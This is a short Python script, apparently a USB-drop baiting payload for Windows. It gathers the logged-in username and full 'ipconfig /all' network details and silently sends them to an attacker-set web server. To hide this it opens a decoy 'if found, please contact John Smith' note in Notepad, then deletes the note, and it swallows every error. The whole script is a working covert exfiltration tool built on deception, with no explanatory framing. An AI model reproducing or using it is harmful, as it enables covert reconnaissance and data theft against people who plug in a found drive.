from requests import get as send
from subprocess import check_output as run
from time import sleep
from os import system, getlogin

try:
    web_server_ip = "192.168.0.100" # <------ CHANGE THIS
    username = getlogin()
    ipconfig = str(run("ipconfig /all")).replace('#2', ' ')
    data = ("\n\nConnection details:\n"\
            "-------------------\n"\
            "Username: " + username + "\n"\
            "Network details: \n" +\
            ipconfig + "\n")

    with open("if_found.txt","w+") as cover_up:
        cover_up.write("If found you have found this USB stick, "\
                       "please contact John Smith on 0412 345 678. "\
                       "Thanks!")
    system("start /MAX notepad.exe if_found.txt")

    try:
        send(url = "http://" + web_server_ip, params=data, timeout=1)
    except:
        pass
    
    sleep(0.2)
    system("del if_found.txt")
except:
    pass
